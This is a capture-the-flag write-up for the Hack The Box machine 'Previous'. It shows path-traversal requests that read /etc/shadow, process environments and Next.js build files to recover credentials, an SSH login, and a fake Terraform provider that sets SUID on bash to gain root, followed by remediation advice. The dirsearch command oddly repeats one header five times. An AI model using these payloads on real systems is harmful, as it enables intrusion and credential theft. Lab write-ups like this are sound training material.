# HTB Previous — Full Writeup

**Machine:** Previous | **OS:** Linux | **Difficulty:** Medium  
**IP:** 10.10.11.83 | **Hostname:** previous.htb

---

## 1. Setup

Connected to HTB via OpenVPN and mapped the target IP to the hostname:

```bash
echo "10.10.11.83 previous.htb" >> /etc/hosts
```

Confirmed reachability:

```bash
ping previous.htb
```

![HTB and OpenVPN Setup](screenshots/B01-htb-vpn-setup.png)

![Ping confirming reachability](screenshots/B02-ping-reachability.png)

---

## 2. Reconnaissance

### 2.1 Port Scan — Nmap

```bash
nmap -sC -sV -oN nmap_initial.txt 10.10.11.83
```

**Results:** Two open ports:
- Port 22 — SSH (OpenSSH)
- Port 80 — HTTP (Next.js web application)

![Nmap scan — two open ports](screenshots/B03-nmap-scan-open-ports.png)

Only two services exposed — attack surface was narrow. Focus shifted to the web application.

---

## 3. Web Enumeration

### 3.1 Initial Visit

Browsed to `http://previous.htb` — login page, no registration or guest access.

![PreviousJS login page](screenshots/B06-previousjs-login-page.png)

### 3.2 API Endpoint Discovery — Dirsearch

Ran dirsearch with a bypass header to get around Next.js middleware:

```bash
pip install dirsearch

dirsearch -u http://previous.htb -H "next-action: 1" -H "next-action: 1" \
  -H "next-action: 1" -H "next-action: 1" -H "next-action: 1"
```

![Dirsearch install](screenshots/B04-dirsearch-install.png)

![Dirsearch output — /api/download discovered](screenshots/B05-dirsearch-api-download.png)

Discovered: `/api/download` endpoint.

---

## 4. Local File Inclusion (LFI)

### 4.1 Parameter Fuzzing — FFUF

```bash
ffuf -u "http://previous.htb/api/download?FUZZ=test" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs [default_size]
```

![FFUF — example parameter identified](screenshots/B07-ffuf-example-parameter.png)

`example` parameter produced a different response size — confirmed functional.

### 4.2 Directory Traversal Test

```bash
curl "http://previous.htb/api/download?example=../../../../etc/passwd"
```

![LFI — /etc/passwd retrieved](screenshots/B08-lfi-etc-passwd.png)

LFI confirmed — arbitrary file read via path traversal.

### 4.3 Reading Sensitive Files

```bash
# Read sensitive system files
curl "http://previous.htb/api/download?example=../../../../etc/shadow"
```

![LFI — sensitive file read](screenshots/B09-lfi-sensitive-files.png)

### 4.4 Dump Process Environment

```bash
curl "http://previous.htb/api/download?example=../../../../proc/self/environ"
```

![Process environment dump](screenshots/B10-lfi-proc-environ.png)

Revealed internal paths, Next.js version, and service context.

---

## 5. Next.js Build Artifact Extraction

### 5.1 Install jq and Enumerate Dynamic Routes

```bash
apt install jq

curl "http://previous.htb/api/download?example=../../../../.next/server/pages-manifest.json" | jq .
```

![jq install prompt](screenshots/B11-jq-install-prompt.png)

![jq install process](screenshots/B12-jq-install-process.png)

![Dynamic routes output — part 1](screenshots/B13-dynamic-routes-output-1.png)

![Dynamic routes output — part 2](screenshots/B14-dynamic-routes-output-2.png)

Revealed `/api/auth` — authentication handler route.

### 5.2 Extract Credentials from Auth Handler

```bash
curl "http://previous.htb/api/download?example=../../../../.next/server/chunks/[auth_chunk].js"
```

![Credentials extracted from Next.js source](screenshots/B15-credentials-extracted.png)

**Credentials recovered:**
```
Username: jeremy
Password: MyNameIsJeremyAndILovePancakes
```

---

## 6. Authentication and Initial Foothold

### 6.1 Login to Web App

![Login with extracted credentials](screenshots/B16-login-with-credentials.png)

![Dashboard — authenticated](screenshots/B17-dashboard-authenticated.png)

### 6.2 SSH Access

```bash
ssh jeremy@10.10.11.83
# Password: MyNameIsJeremyAndILovePancakes
```

![SSH shell — login successful](screenshots/B18-ssh-shell-1.png)

![SSH shell — interactive session](screenshots/B19-ssh-shell-2.png)

### 6.3 User Flag

```bash
cat ~/user.txt
```

![User flag obtained](screenshots/B20-user-flag.png)

User flag ✅

---

## 7. Privilege Escalation — Terraform Provider Hijack

### 7.1 Inspect Privesc Folder

```bash
ls /opt/examples/
cat /opt/examples/main.tf
```

![Privesc folder inspection](screenshots/B21-privesc-folder.png)

Found a Terraform configuration referencing a custom provider — provider binary path was controllable.

### 7.2 Create Malicious Provider Binary

```bash
cat > /tmp/terraform-provider-fake << 'PAYLOAD'
#!/bin/bash
chmod u+s /bin/bash
PAYLOAD

chmod +x /tmp/terraform-provider-fake
```

![Fake provider binary created](screenshots/B22-fake-provider-binary.png)

### 7.3 Execute Terraform and Spawn Root Shell

```bash
cd /opt/examples
terraform init && terraform apply

# Check SUID bit set
ls -la /bin/bash

# Spawn root shell
/bin/bash -p
whoami  # root
```

![Root flag obtained](screenshots/B23-root-flag.png)

![Machine pwned](screenshots/B24-machine-pwned.png)

Root flag ✅ — Machine fully compromised.

---

## 8. Remediation

| Finding | Recommendation |
|---------|---------------|
| LFI via `/api/download` | Validate and sanitise all file path inputs. Use an allowlist of permitted files only. |
| Credentials in Next.js build artifacts | Never embed credentials in source code. Use runtime environment variables. |
| Terraform provider path misconfiguration | Restrict write access to provider directories. Validate binary integrity with checksums. Run Terraform as non-privileged user. |
| Credential reuse across services | Enforce unique credentials per service. Implement MFA on SSH where possible. |

---

## 9. Flags

| Flag | Status |
|------|--------|
| User (jeremy) | ✅ Obtained |
| Root | ✅ Obtained |

---

